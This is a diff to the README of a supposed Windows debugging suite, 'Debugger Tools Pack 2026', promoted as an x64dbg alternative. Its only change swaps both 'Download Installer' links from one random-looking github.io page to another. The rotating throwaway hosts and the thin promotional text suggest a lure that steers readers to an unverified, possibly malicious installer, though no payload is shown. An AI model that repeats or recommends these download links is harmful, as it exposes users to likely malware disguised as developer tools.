@@ -2,7 +2,7 @@
 
 Debugger Tools Pack 2026 is an advanced full debug suite designed for Windows desktop environments. It provides a comprehensive set of tools for debugging, reverse engineering, and software development, making it an ideal alternative to x64dbg and other debugger tools. With its user-friendly interface and powerful features, it caters to both professionals and enthusiasts in the debugging community.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -74,7 +74,7 @@ Kernel debugging involves working with system-level code, which can affect syste
 
 To get started, download the latest version from the official source:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License and Copyright
 
